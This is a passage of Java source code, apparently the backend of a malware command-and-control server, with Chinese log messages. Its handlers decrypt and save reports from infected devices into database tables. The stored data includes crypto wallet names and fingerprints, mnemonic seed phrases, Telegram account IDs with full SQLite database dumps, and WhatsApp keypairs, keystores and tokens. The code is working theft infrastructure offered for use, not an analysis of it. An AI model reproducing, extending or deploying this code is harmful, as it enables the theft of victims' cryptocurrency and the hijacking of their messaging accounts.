            e.setClientIp(ctx.getClientIp());
            e.setXTs(ctx.getXTs());
            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
            e.setKeyLabel(ctx.getKeyLabel() == null ? "" : ctx.getKeyLabel());
            e.setErrorMsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
            e.setEcid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
            e.setC2Uid(plaintext == null ? "" : str(plaintext, "u"));
            e.setSerial(plaintext == null ? "" : str(plaintext, "s"));
            e.setSourceTag(plaintext == null ? "" : str(plaintext, "source"));
            e.setClientVer(plaintext == null ? "" : str(plaintext, "v"));
            e.setChannelHash(plaintext == null ? "" : str(plaintext, "channelHash"));
            Object ba = plaintext == null ? null : plaintext.get("ba");
            e.setBaJson(ba == null ? "" : JSONObject.toJSONString(ba));
            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
            e.setDecryptedAt(System.currentTimeMillis() / 1000.0);
            ubDecryptDao.insert(e);
            if (reportedAddressMatchService != null && plaintext != null) {
                try {
                    reportedAddressMatchService.ingestUb(ctx, plaintext, e.getId());
                } catch (Exception me) {
                    log.info("异常日志:[c2_handlers][ub_decrypt] 上报地址入库失败, recordId={}, err={}",
                            ctx.getRecordId(), me.getMessage());
                }
            }
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][ub_decrypt] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    // ---------- /uj ----------

    /** /uj 业务落库 → uj_decrypt */
    public void saveUjDecrypt(C2HandlerContext ctx, JSONObject plaintext) {
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][uj_decrypt] 无 device_row_id，跳过写入, recordId={}",
                    ctx.getRecordId());
            return;
        }
        try {
            UjDecryptEntity e = new UjDecryptEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setDeviceId(ctx.getDeviceRowId());
            e.setClientIp(ctx.getClientIp());
            e.setXTs(ctx.getXTs());
            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
            e.setKeyLabel(ctx.getKeyLabel() == null ? "" : ctx.getKeyLabel());
            e.setErrorMsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
            e.setEcid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
            e.setC2Uid(plaintext == null ? "" : str(plaintext, "u"));
            e.setSerial(plaintext == null ? "" : str(plaintext, "s"));
            e.setSourceTag(plaintext == null ? "" : str(plaintext, "source"));
            e.setClientVer(plaintext == null ? "" : str(plaintext, "v"));
            e.setChannelHash(plaintext == null ? "" : str(plaintext, "channelHash"));
            Object result = plaintext == null ? null : plaintext.get("result");
            e.setResultJson(result == null ? "" : JSONObject.toJSONString(result));
            e.setResultType(plaintext == null ? "" : str(plaintext, "resultType"));
            e.setFingerprint(plaintext == null ? "" : str(plaintext, "fingerprint"));
            e.setWalletName(plaintext == null ? "" : str(plaintext, "walletName"));
            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
            e.setDecryptedAt(System.currentTimeMillis() / 1000.0);
            ujDecryptDao.insert(e);
            if (reportedAddressMatchService != null && plaintext != null) {
                try {
                    reportedAddressMatchService.ingestUj(ctx, plaintext, e.getId());
                } catch (Exception me) {
                    log.info("异常日志:[c2_handlers][uj_decrypt] 上报地址入库失败, recordId={}, err={}",
                            ctx.getRecordId(), me.getMessage());
                }
            }
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][uj_decrypt] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    // ---------- /api/tg/t ----------

    /** Telegram 上报落库 → tg_report */
    public void saveTgReport(C2HandlerContext ctx, JSONObject plaintext) {
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][tg_report] 无 device_row_id，跳过写入, recordId={}",
                    ctx.getRecordId());
            return;
        }
        try {
            TgReportEntity e = new TgReportEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setDeviceRowId(ctx.getDeviceRowId());
            e.setClientIp(ctx.getClientIp());
            e.setXTs(ctx.getXTs());
            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
            e.setKeyLabel(ctx.getKeyLabel() == null ? "" : ctx.getKeyLabel());
            e.setErrorMsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
            e.setEcid(firstNonEmpty(str(plaintext, "ecid"), ctx.getDeviceId()));
            e.setSerial(str(plaintext, "serial"));
            e.setUniqueId(str(plaintext, "unique"));
            e.setChannelcode(firstNonEmpty(str(plaintext, "channel"),
                    ctx.getChannelcode() == null ? "" : ctx.getChannelcode()));
            e.setUserId(str(plaintext, "user_id"));
            Object state = plaintext == null ? null : plaintext.get("state");
            e.setStateJson(state == null ? "" : (state instanceof String
                    ? (String) state : JSONObject.toJSONString(state)));
            String dbSqlite = str(plaintext, "db_sqlite");
            e.setDbSqlite(dbSqlite);
            e.setDbSqliteLen(dbSqlite.isEmpty() ? 0 : dbSqlite.length());
            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
            double now = System.currentTimeMillis() / 1000.0;
            e.setDecryptedAt(now);
            e.setAddtime(now);
            tgReportDao.insert(e);
            log.info("正常日志:[c2_handlers][tg_report] 写入成功, recordId={}, id={}, userId={}, dbLen={}",
                    ctx.getRecordId(), e.getId(), e.getUserId(), e.getDbSqliteLen());
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][tg_report] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    // ---------- /api/wp/t ----------

    /** WhatsApp 上报落库 → wp_report */
    public void saveWpReport(C2HandlerContext ctx, JSONObject plaintext) {
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][wp_report] 无 device_row_id，跳过写入, recordId={}",
                    ctx.getRecordId());
            return;
        }
        try {
            WpReportEntity e = new WpReportEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setDeviceRowId(ctx.getDeviceRowId());
            e.setClientIp(ctx.getClientIp());
            e.setXTs(ctx.getXTs());
            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
            e.setKeyLabel(ctx.getKeyLabel() == null ? "" : ctx.getKeyLabel());
            e.setErrorMsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
            e.setEcid(firstNonEmpty(str(plaintext, "ecid"), ctx.getDeviceId()));
            e.setSerial(str(plaintext, "serial"));
            e.setUniqueId(str(plaintext, "unique"));
            e.setChannelcode(firstNonEmpty(str(plaintext, "channel"),
                    ctx.getChannelcode() == null ? "" : ctx.getChannelcode()));
            e.setApiType(str(plaintext, "apiType"));
            e.setAppVersion(str(plaintext, "_version"));
            e.setUserId(str(plaintext, "userId"));
            e.setPhoneId(str(plaintext, "phoneId"));
            e.setNickname(str(plaintext, "nickname"));
            e.setClientStaticKeypairBase64(str(plaintext, "clientStaticKeypairBase64"));
            Object keyStore = plaintext == null ? null : plaintext.get("phoneKeyStore");
            e.setPhoneKeystoreJson(keyStore == null ? "" : JSONObject.toJSONString(keyStore));
            Object deviceConfig = plaintext == null ? null : plaintext.get("deviceConfig");
            e.setDeviceConfigJson(deviceConfig == null ? "" : JSONObject.toJSONString(deviceConfig));
            Object deviceInfo = plaintext == null ? null : plaintext.get("deviceInfo");
            e.setDeviceInfoJson(deviceInfo == null ? "" : JSONObject.toJSONString(deviceInfo));
            e.setLocale(str(plaintext, "locale"));
            e.setRoutingInfo(str(plaintext, "routingInfo"));
            e.setUploadTokenRandomBytes(str(plaintext, "uploadTokenRandomBytes"));
            e.setServerStaticPublicBase64(str(plaintext, "serverStaticPublicBase64"));
            e.setProxy(str(plaintext, "proxy"));
            e.setSimOperator(str(plaintext, "sim_operator"));
            Object data = plaintext == null ? null : plaintext.get("data");
            e.setDataJson(data == null ? "" : JSONObject.toJSONString(data));
            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
            double now = System.currentTimeMillis() / 1000.0;
            e.setDecryptedAt(now);
            e.setAddtime(now);
            wpReportDao.insert(e);
            log.info("正常日志:[c2_handlers][wp_report] 写入成功, recordId={}, id={}, userId={}, phoneId={}",
                    ctx.getRecordId(), e.getId(), e.getUserId(), e.getPhoneId());
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][wp_report] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    // ---------- helpers ----------

    /** 业务表必须带上 device 主键；没有则宁可跳过，也不写 device_row_id=0 的脏数据 */
    private static boolean hasDeviceRow(C2HandlerContext ctx) {
        Integer id = ctx == null ? null : ctx.getDeviceRowId();
        return id != null && id > 0;
    }

    /** 拼 image_path：prefix + relative，去掉多余斜杠。prefix 为空则只存 relative。 */
    private static String joinUrlPrefix(String prefix, String relative) {
        String rel = relative == null ? "" : relative.replace("\\", "/").replaceAll("^/+", "");
        if (prefix == null || prefix.trim().isEmpty()) {
            return rel;
        }
        String p = prefix.trim().replace("\\", "/").replaceAll("/+$", "");
        return p + "/" + rel;
    }

    private static String str(JSONObject o, String k) {
        if (o == null) {
            return "";
        }
        Object v = o.get(k);
        return v == null ? "" : v.toString();
    }

    private static String field(java.util.Map<String, String> fields, String k) {
        if (fields == null) {
            return "";
        }
        String v = fields.get(k);
        return v == null ? "" : v;
    }

    private static JSONObject asJsonObject(Object value) {
        if (value instanceof JSONObject) {
            return (JSONObject) value;
        }
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            String s = ((String) value).trim();
            if (s.isEmpty()) {
                return null;
            }
            if (s.startsWith("{") && s.endsWith("}")) {
                try {
                    return JSONObject.parseObject(s);
                } catch (Exception ignore) {
                    // fall through and treat as plain memo text
                }
            }
            JSONObject obj = new JSONObject();
            obj.put("content", s);
            return obj;
        }
        try {
            return (JSONObject) JSONObject.toJSON(value);
        } catch (Exception ignore) {
            return null;
        }
    }

    private static String firstNonEmpty(String... values) {
        if (values == null) {
            return "";
        }
        for (String value : values) {
            if (value != null && !value.isEmpty()) {
                return value;
            }
        }
        return "";
    }

    private static String normalizeMemoType(Object value) {
        if (value == null) {
            return "0";
        }
        String s = value.toString().trim();
        if (s.isEmpty()) {
            return "0";
        }
        try {
            return String.valueOf(Integer.parseInt(s));
        } catch (Exception ignore) {
            return "0";
        }
    }

    /** 助记词加密：配置了 mnemonic-aes-key 则 AES-256-ECB 加密，否则原样 */
    private String encryptMnemonic(String plain) {
        if (plain == null || plain.isEmpty()) {
            return plain;
        }
        if (mnemonicAesKey == null || mnemonicAesKey.isEmpty()) {
            log.info("异常日志:[c2_handlers][mnemonic] 未配置 news4.mnemonic.mnemonic-aes-key，助记词将明文入库");
            return plain;
        }
        return AesStoreCipher.encrypt(plain, mnemonicAesKey);
    }

    private static Long longVal(JSONObject o, String k) {
        if (o == null) {
            return null;
        }
        Object v = o.get(k);
        if (v == null) {
            return null;
        }
        try {
            return Long.parseLong(v.toString());
        } catch (Exception e) {
            return null;
        }
    }

    private static Integer intVal(JSONObject o, String k) {
        Long l = longVal(o, k);
        return l == null ? null : l.intValue();
    }
}
